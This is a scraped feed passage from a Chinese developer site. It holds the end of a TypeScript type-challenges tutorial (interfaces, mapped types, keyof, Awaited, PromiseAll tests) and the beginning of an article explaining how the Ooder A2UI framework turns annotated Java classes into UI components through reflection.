<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {
  <span class="hljs-title function_">printInfo</span>(): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// 类同时实现两个接口（必须实现所有接口的成员）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span>, <span class="hljs-title class_">Printable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 类可扩展接口外的属性</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// 实现 Identifiable 的方法</span>
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>;
  }

  <span class="hljs-comment">// 实现 Printable 的方法</span>
  <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Product: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getId()}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-number">100</span>, <span class="hljs-string">"手机"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product.<span class="hljs-title function_">getId</span>()); <span class="hljs-comment">// 100</span>
product.<span class="hljs-title function_">printInfo</span>(); <span class="hljs-comment">// Product: 手机, ID: 100</span>
</code></pre>
<h4 data-id="heading-7"><code>in</code></h4>
<p><code>in</code> 运算符用于遍历联合类型中的每个成员，将其转换为映射类型的属性名。</p>
<p>例如：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoKeys</span> = <span class="hljs-string">'title'</span> | <span class="hljs-string">'description'</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoPreview</span> = {
  [P <span class="hljs-keyword">in</span> <span class="hljs-title class_">TodoKeys</span>]: <span class="hljs-title class_">Todo</span>[P]
}
<span class="hljs-comment">// TodoPreview 类型为：</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   title: string</span>
<span class="hljs-comment">//   completed: boolean</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-8"><code>keyof</code></h4>
<p><code>keyof</code> 运算符用于获取一个类型（接口、类型别名、对象类型等）的所有公共属性名，并返回这些属性名组成的联合类型。</p>
<p>例如：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoKeys</span> = keyof <span class="hljs-title class_">Todo</span> <span class="hljs-comment">// "title" | "description" | "completed"</span>
</code></pre>
<h4 data-id="heading-9"><code>Awaited</code></h4>
<p><code>Awaited&lt;Type&gt;</code> 用于提取嵌套 <code>Promise</code> 类型的最终解析值。</p>
<ol>
<li>当 <code>T</code> 是 <code>Promise&lt;U&gt;</code> 时，<code>Awaited&lt;T&gt;</code> 会返回 <code>U</code>。</li>
<li>如果 <code>U</code> 本身也是 <code>Promise&lt;V&gt;</code>，则 <code>Awaited&lt;T&gt;</code> 会继续递归，返回 <code>V</code>。</li>
<li>若 <code>T</code> 不是 <code>Promise</code> 类型，则直接返回 <code>T</code>。</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> A = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// string</span>

<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;&gt;&gt;; <span class="hljs-comment">// number</span>

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">Awaited</span>&lt;<span class="hljs-built_in">boolean</span> | <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;&gt;; <span class="hljs-comment">// number | boolean</span>
</code></pre>
<h3 data-id="heading-10">测试用例</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ 测试用例 _____________ */</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Equal</span>, <span class="hljs-title class_">Expect</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@type-challenges/utils'</span>

<span class="hljs-keyword">const</span> promiseAllTest1 = <span class="hljs-title class_">PromiseAll</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>)
<span class="hljs-keyword">const</span> promiseAllTest2 = <span class="hljs-title class_">PromiseAll</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">3</span>)] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>)
<span class="hljs-keyword">const</span> promiseAllTest3 = <span class="hljs-title class_">PromiseAll</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">3</span>)])
<span class="hljs-keyword">const</span> promiseAllTest4 = <span class="hljs-title class_">PromiseAll</span>&lt;<span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">number</span> | <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;&gt;&gt;([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
<span class="hljs-keyword">const</span> promiseAllTest5 = <span class="hljs-title class_">PromiseAll</span>&lt;(<span class="hljs-built_in">number</span> | <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;)[]&gt;([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'3'</span>)])

<span class="hljs-keyword">type</span> cases = [
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest1, <span class="hljs-title class_">Promise</span>&lt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]&gt;&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest2, <span class="hljs-title class_">Promise</span>&lt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-built_in">number</span>]&gt;&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest3, <span class="hljs-title class_">Promise</span>&lt;[<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>]&gt;&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest4, <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>[]&gt;&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-keyword">typeof</span> promiseAllTest5, <span class="hljs-title class_">Promise</span>&lt;(<span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>)[]&gt;&gt;&gt;,
]

</code></pre>
<h3 data-id="heading-11">相关链接</h3>
<blockquote>
<p>分享你的解答：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F20%2Fanswer%2Fzh-CN" target="_blank" title="https://tsch.js.org/20/answer/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/20/answer/z…</a>
查看解答：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F20%2Fsolutions" target="_blank" title="https://tsch.js.org/20/solutions" ref="nofollow noopener noreferrer">tsch.js.org/20/solution…</a>
更多题目：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2Fzh-CN" target="_blank" title="https://tsch.js.org/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/zh-CN</a></p>
</blockquote>
<p>下面是我的公众号，欢迎关注。关注后有新的功能点会及时收到推送。</p>
<blockquote>
<p><strong>前端功能点</strong>：实战为王！专注于汇总各种功能点，致力于打造一系列能够帮助工程师实现各种功能的想法思路的优质文章。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Ooder A2UI 第一性原理出发 深度解析核心逻辑]]></title>    <link>https://juejin.cn/post/7602454700503810089</link>    <guid>https://juejin.cn/post/7602454700503810089</guid>    <pubDate>2026-02-03T14:10:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602454700503810089" data-draft-id="7602503154505383977" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Ooder A2UI 第一性原理出发 深度解析核心逻辑"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-03T14:10:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Ooder A2UI 第一性原理出发 深度解析核心逻辑
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:10:58.000Z" title="Tue Feb 03 2026 14:10:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读19分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>Ooder A2UI（Annotation to UI）是Ooder框架的核心组件之一，负责将Java类通过注解驱动的方式自动转换为UI组件。这一机制是Ooder实现"配置即代码"理念的关键技术，也是外界最质疑的地方：<strong>究竟是什么逻辑让它能够完成拆解？如何保证确定性？组织类方法的原则规则是什么？</strong></p>
<p>本文将从第一性原理出发，深入剖析A2UI的核心设计，还原作者的设计思考过程。</p>
<h2 data-id="heading-1">A2UI 拆解机制的核心原理</h2>
<h3 data-id="heading-2">1. 整体架构概览</h3>
<p>A2UI的拆解机制基于<strong>注解驱动的反射分析</strong>，通过多层次的抽象和映射，将Java类转换为UI组件。整体架构如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b86710486af040f1a74cb9edd948eb08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=Cb9%2FKytN7lOQYLEYLt8sp1xZ9JY%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h3 data-id="heading-3">2. 六阶段拆解流程</h3>
<p>A2UI的拆解过程分为六个明确的阶段，每个阶段都有其特定的职责和确定性保障。</p>
<h4 data-id="heading-4">阶段1：类加载阶段</h4>
<p>ReflectionClassLoaderBridgeClassUserReflectionClassLoaderBridgeClassUser创建BridgeClass加载Java类获取类信息返回类信息返回类对象获取所有字段返回字段列表获取所有方法返回方法列表返回BridgeClass实例</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23b5694417794ea9b6fdb8afbaaf2535~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=686cL98ysllVGLIi%2BD%2FvQszPW8Q%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">Class ctClass</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctClass</span> = ctClass;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">allCtFields</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// 获取声明的字段（非静态、非内部类字段）</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : ctClass.<span class="hljs-title function_">getDeclaredFields</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(field.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(field.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"this$"</span>)) {
            allCtFields.<span class="hljs-title function_">add</span>(field);
        }
    }

    <span class="hljs-comment">// 获取公共字段</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : ctClass.<span class="hljs-title function_">getFields</span>()) {
        <span class="hljs-keyword">if</span> (field.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(ctClass)
                &amp;&amp; !field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"this$"</span>)
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(field.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !field.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>)) {
            allCtFields.<span class="hljs-title function_">add</span>(field);
        }
    }

    <span class="hljs-comment">// 获取声明的方法（非静态）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">allCtMethods</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; methodNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Method</span> method : ctClass.<span class="hljs-title function_">getDeclaredMethods</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(method.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getDeclaringClass</span>())) {
            allCtMethods.<span class="hljs-title function_">add</span>(method);
            methodNames.<span class="hljs-title function_">add</span>(method.<span class="hljs-title function_">getName</span>());
        }
    }

    <span class="hljs-comment">// 获取公共方法（去重）</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Method</span> method : ctClass.<span class="hljs-title function_">getMethods</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(method.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !methodNames.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getName</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(ctClass)
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Enum</span>.<span class="hljs-property">class</span>)
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>)) {
            allCtMethods.<span class="hljs-title function_">add</span>(method);
        }
    }
}
</code></pre>
<h4 data-id="heading-5">设计思考：</h4>
<ol>
<li><strong>为什么区分声明字段和公共字段？</strong>
<ul>
<li>声明字段：获取类自己定义的字段，包括私有字段</li>
<li>公共字段：获取继承的公共字段，支持继承场景</li>
</ul>
</li>
<li><strong>为什么过滤静态成员？</strong>
<ul>
<li>静态成员属于类而非实例，不适合UI绑定</li>
<li>避免静态成员干扰UI渲染</li>
</ul>
</li>
<li><strong>为什么过滤内部类字段？</strong>
<ul>
<li>内部类字段通常用于编译器生成的辅助逻辑</li>
<li>避免将编译器生成的字段误认为业务字段</li>
</ul>
</li>
</ol>
<h4 data-id="heading-6">阶段2：注解解析阶段</h4>
<p>​</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d070da24dc441669ae7c902480889d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=GBqm3R8RHzlBOxFvj5G5r%2Fv78HI%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">MethodChinaName</span> chinaName = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">MethodChinaName</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (chinaName != <span class="hljs-literal">null</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">methodChinaBean</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodChinaMeta</span>(chinaName);
}

<span class="hljs-title class_">RepositoryAnnotation</span> repository = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">RepositoryAnnotation</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (repository != <span class="hljs-literal">null</span>) {
    repositoryBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RepositoryMeta</span>(repository);
}

<span class="hljs-title class_">Aggregation</span> aggregationClass = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">Aggregation</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (aggregationClass != <span class="hljs-literal">null</span>) {
    aggregationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AggregationBean</span>(aggregationClass);
}

<span class="hljs-title class_">ESDEntity</span> dsmEntityClass = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">ESDEntity</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (dsmEntityClass != <span class="hljs-literal">null</span>) {
    entityBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EntityBean</span>(dsmEntityClass);
}

<span class="hljs-title class_">MenuBarMenu</span> menuBarMenu = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">MenuBarMenu</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (menuBarMenu != <span class="hljs-literal">null</span>) {
    menuBarBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MenuBarMeta</span>(menuBarMenu);
}

<span class="hljs-title class_">DBTable</span> dbTable = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">DBTable</span>.<span class="hljs-property">class</span>);

<span class="hljs-title class_">RequestMapping</span> requestMapping = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">RequestMapping</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (requestMapping != <span class="hljs-literal">null</span>) {
    requestMappingBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingBean</span>(requestMapping);
}

<span class="hljs-title class_">View</span> view = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">View</span>.<span class="hljs-property">class</span>);
<span class="hljs-keyword">if</span> (view != <span class="hljs-literal">null</span>) {
    viewBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewBean</span>(view);
}
</code></pre>
<h4 data-id="heading-7">设计思考：</h4>
<ol>
<li><strong>为什么需要这么多类级别注解？</strong>
<ul>
<li>不同的注解对应不同的业务场景</li>
<li>@Aggregation：聚合视图，用于组合多个实体</li>
<li>@Repository：仓储视图，用于数据访问</li>
<li>@ESDEntity：实体视图，用于数据实体</li>
<li>@MenuBarMenu：菜单视图，用于导航菜单</li>
<li>@RequestMapping：REST视图，用于API接口</li>
<li>@View：通用视图，用于自定义视图</li>
</ul>
</li>
<li><strong>为什么注解解析后要转换为Bean？</strong>
<ul>
<li>统一的数据结构，便于后续处理</li>
<li>解耦注解类型和业务逻辑</li>
<li>支持注解的版本演进</li>
</ul>
</li>
</ol>
<h4 data-id="heading-8">阶段3：字段拆解阶段</h4>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89ece97dcf744ef18cc23c16d13daaed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=hivxwzegVDtGfCrBWurs9kPen7w%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p><strong>核心代码分析：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">initField</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">BridgeField</span>&gt; fieldMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">BridgeField</span>&gt; disableFieldMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
